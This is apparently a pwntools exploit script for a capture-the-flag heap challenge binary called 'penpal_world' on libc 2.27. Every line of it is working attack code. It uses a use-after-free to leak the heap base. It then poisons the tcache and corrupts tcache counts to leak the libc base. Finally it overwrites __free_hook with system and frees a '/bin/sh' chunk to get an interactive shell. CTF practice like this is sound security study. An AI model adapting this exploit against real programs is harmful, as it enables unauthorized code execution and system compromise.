#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./penpal_world")
p = process("./penpal_world")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.27.so")

def malloc(index):
    p.recvuntil("4) Read a postcard")
    p.sendline("1")
    p.recvline()
    p.sendline(str(index))

def free(index):
    p.recvuntil("4) Read a postcard")
    p.sendline("3")
    p.recvline()
    p.sendline(str(index))

def edit(index,data):
    p.recvuntil("4) Read a postcard")
    p.sendline("2")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.send(data)

def view(index):
    p.recvuntil("4) Read a postcard")
    p.sendline("4")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    leak = p.recvline()[:-1]
    return leak

malloc(0)
malloc(1)
free(0)
free(1)
leak = view(1)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
heap_base = leak-0x260
log.critical("Heap base address: {}".format(hex(heap_base)))
edit(1,p64(heap_base+0x10))
malloc(1)
malloc(1)
edit(1,p64(0x0)*4+3*p8(0x0)+p8(0x7))
free(1)
leak = view(1)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x3aeca0
log.critical("Libc base address: {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
system = libc.sym.system
edit(1,p64(0x0)+p64(0x0))
free(0)
free(0)
edit(0,p64(__free_hook))
malloc(0)
edit(0,b"/bin/sh\x00")
malloc(1)
edit(1,p64(system))
free(0)
p.interactive()